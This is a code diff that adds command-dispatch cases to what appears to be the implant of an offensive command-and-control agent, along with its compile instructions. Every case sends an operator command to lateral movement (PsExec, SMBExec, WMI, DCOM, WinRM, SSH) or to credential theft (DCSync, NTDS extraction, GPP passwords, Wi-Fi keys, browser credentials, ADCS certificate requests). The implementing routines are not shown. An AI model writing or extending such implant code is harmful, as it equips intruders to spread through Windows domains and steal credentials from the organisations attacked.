@@ -1,0 +1,59 @@
+// ─── INSERT THESE CASES INTO Agent.cs SWITCH STATEMENT ───────────────────────
+// Compile with: mcs Agent.cs AgentLateral.cs AgentEvasion.cs AgentPostEx.cs AgentNetwork.cs Config*.cs -out:agent.exe -r:System.Web.dll
+// ─────────────────────────────────────────────────────────────────────────────
+
+                case "lateral-psexec":
+                    result = Lateral.PsExec(cmd.Args);
+                    break;
+
+                case "lateral-smbexec":
+                    result = Lateral.SmbExec(cmd.Args);
+                    break;
+
+                case "lateral-atexec":
+                    result = Lateral.AtExec(cmd.Args);
+                    break;
+
+                case "lateral-wmi":
+                    result = Lateral.Wmi(cmd.Args);
+                    break;
+
+                case "lateral-dcom":
+                    result = Lateral.Dcom(cmd.Args);
+                    break;
+
+                case "lateral-winrm":
+                    result = Lateral.WinRM(cmd.Args);
+                    break;
+
+                case "lateral-ssh":
+                    result = Lateral.Ssh(cmd.Args);
+                    break;
+
+                case "lateral-runas":
+                    result = Lateral.RunAs(cmd.Args);
+                    break;
+
+                case "adcs-request":
+                    result = Lateral.AdcsRequest(cmd.Args);
+                    break;
+
+                case "dcsync":
+                    result = Lateral.DcSync(cmd.Args);
+                    break;
+
+                case "cred-gpp":
+                    result = Lateral.CredGpp(cmd.Args);
+                    break;
+
+                case "cred-wifi":
+                    result = Lateral.CredWifi(cmd.Args);
+                    break;
+
+                case "cred-browser":
+                    result = Lateral.CredBrowser(cmd.Args);
+                    break;
+
+                case "cred-ntds":
+                    result = Lateral.CredNtds(cmd.Args);
+                    break;
